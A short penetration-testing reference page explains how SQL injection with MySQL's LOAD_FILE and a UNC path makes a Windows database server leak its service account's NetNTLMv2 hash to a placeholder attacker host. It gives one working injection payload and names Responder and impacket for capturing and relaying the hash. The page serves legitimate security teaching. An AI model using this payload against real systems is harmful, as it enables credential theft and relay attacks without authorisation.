---
title: "Capturing NetNTLM hashes from MySQL via UNC paths"
description: "Forcing a Windows MySQL host to authenticate to an attacker SMB share through LOAD_FILE, capturing the service account's NetNTLM hash for cracking or relay."
keywords:
  - NTLM hash capture
  - SMB authentication
  - LOAD_FILE UNC
  - Responder
  - NetNTLMv2
---

# UNC and NTLM capture

When a Windows MySQL host connects to a UNC path, it authenticates to the remote SMB server as the account running the MySQL service. Pointing that path at an attacker-controlled SMB listener captures the account's NetNTLMv2 response, which can be cracked offline or relayed to another service.

A single `LOAD_FILE` to the attacker's share triggers the authentication:

```sql
' UNION SELECT LOAD_FILE('\\\\attacker.tld\\share\\x'),NULL,NULL-- 
```

A listener such as Responder or `impacket-smbserver` on `attacker.tld` records the incoming NetNTLMv2 hash for the MySQL service account. Whether that hash is useful depends on the account: a service running as a domain user yields a crackable or relayable credential, while `NT AUTHORITY\SYSTEM` yields a machine account hash that is only relayable.

Unlike DNS exfiltration, this channel leaks a credential rather than query data, so it is often the higher-value outcome against a Windows target, especially where the MySQL service runs under a privileged domain account. It needs the same `FILE` privilege and permissive `secure_file_priv`, and only works on Windows.

## Tools

- Responder
- impacket (`smbserver.py`, `ntlmrelayx.py`)

## References

- MySQL Reference Manual: LOAD_FILE, FILE privilege
- OWASP Testing Guide: Testing for SQL Injection
